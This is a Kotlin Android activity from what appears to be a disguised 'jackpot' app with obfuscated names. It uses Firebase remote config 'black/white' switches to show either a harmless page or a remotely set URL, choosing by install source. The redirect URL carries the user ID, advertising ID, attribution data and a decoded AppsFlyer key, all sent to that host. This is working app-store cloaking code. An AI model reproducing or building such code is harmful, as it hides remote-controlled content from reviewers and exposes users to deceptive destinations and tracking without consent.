package com.citys.jackpotys.com

import android.content.Intent
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.transition.ChangeBounds
import android.transition.Scene
import android.transition.TransitionManager
import android.widget.ProgressBar
import androidx.core.app.ActivityOptionsCompat
import androidx.lifecycle.lifecycleScope
import com.citys.jackpotys.com.Utilities2wlkzq1e.*
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity2wlkzg1e : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main_2wlkzq1e)
        getSharedPreferences("SP_2wlkzg1e", MODE_PRIVATE).getString("Last_Page_2wlkzq1e", null)?.let {
            startActivity(Intent(this, WebActivity2wlkzq1e::class.java))
            finish()
        }
        Firebase.remoteConfig.run {
            setConfigSettingsAsync(
                remoteConfigSettings {
                    minimumFetchIntervalInSeconds = 1000
                })
            setDefaultsAsync(
                mapOf(
                    FB_BLACK_KEY_2wlkzq1e to "empty"
                )
            )
            fetchAndActivate().addOnCompleteListener {
                if (it.isSuccessful) {
                    fbBlackValue2wlkzq1e = getString(FB_BLACK_KEY_2wlkzq1e)
                    fbDefaultValue2wlkzq1e = getString(FB_DEFAULT_KEY_2wlkzq1e)
                    fbWhiteValue2wlkzq1e = getString(FB_WHITE_KEY_2wlkzq1e)
                }
            }
        }
        clickSetup2wlkzq1e {
            it.isClickable = false
            TransitionManager.go(
                Scene.getSceneForLayout(findViewById(R.id.cl_2wlkzg1e), R.layout.scene_main_2wlkzq1e, this),
                ChangeBounds()
            )
            lifecycleScope.launch {
                delay(100)
                animationBackGround2wlkzg1e()
                for (i2wlkzq1e in 0..100) {
                    findViewById<ProgressBar>(R.id.pb_2wlkzg1e).progress = i2wlkzq1e
                    delay(50)
                }
                parsedURL2wlkzq1e = if (fbBlackValue2wlkzq1e == null || fbBlackValue2wlkzq1e == "empty") {
                    fbWhiteValue2wlkzq1e ?: return@launch
                } else {
                    if (status2wlkzq1e == "Non-organic") {
                        if (key2wlkzq1e.toString().length != 20) {
                            Uri.parse(fbBlackValue2wlkzq1e).buildUpon()
                                .appendQueryParameter("key", fbDefaultValue2wlkzq1e)
                                .appendQueryParameter("bundle", packageName)
                                .appendQueryParameter("sub4", adGroup2wlkzq1e)
                                .appendQueryParameter("sub5", adSet22wlkzq1e)
                                .appendQueryParameter("sub6", afChannel2wlkzq1e)
                                .appendQueryParameter("sub7", "Default")
                                .toString()
                                .plus(
                                    "&sub10=$uid2wlkzq1e||$AID2wlkzq1e||${
                                        CODE_APPSFLYER_2wlkzq1e.decodeStrings2wlkzg1e()
                                    }"
                                )

                        } else {
                            Uri.parse(fbBlackValue2wlkzq1e).buildUpon()
                                .appendQueryParameter("key", key2wlkzq1e)
                                .appendQueryParameter("bundle", packageName)
                                .appendQueryParameter("sub2", sub22wlkzq1e)
                                .appendQueryParameter("sub3", sub32wlkzq1e)
                                .appendQueryParameter("sub4", adGroup2wlkzq1e)
                                .appendQueryParameter("sub5", adSet22wlkzq1e)
                                .appendQueryParameter("sub6", afChannel2wlkzq1e)
                                .appendQueryParameter("sub7", mediaSource2wlkzq1e)
                                .toString()
                                .plus(
                                    "&sub10=$uid2wlkzq1e||$AID2wlkzq1e||${
                                        CODE_APPSFLYER_2wlkzq1e.decodeStrings2wlkzg1e()
                                    }"
                                )

                        }
                    } else {
                        Uri.parse(fbBlackValue2wlkzq1e).buildUpon()
                            .appendQueryParameter("key", fbDefaultValue2wlkzq1e)
                            .appendQueryParameter("bundle", packageName)
                            .appendQueryParameter("sub7", "Organic")
                            .toString()
                            .plus(
                                "&sub10=$uid2wlkzq1e||$AID2wlkzq1e||${
                                    CODE_APPSFLYER_2wlkzq1e.decodeStrings2wlkzg1e()
                                }"
                            )

                    }
                }
                startActivity(
                    Intent(this@MainActivity2wlkzg1e, WebActivity2wlkzq1e::class.java),
                    ActivityOptionsCompat.makeSceneTransitionAnimation(this@MainActivity2wlkzg1e,
                        findViewById(R.id.v_2wlkzg1e),
                        "view_in")
                        .toBundle())

            }
        }
    }

    override fun onStop() {
        finish()
        super.onStop()
    }
}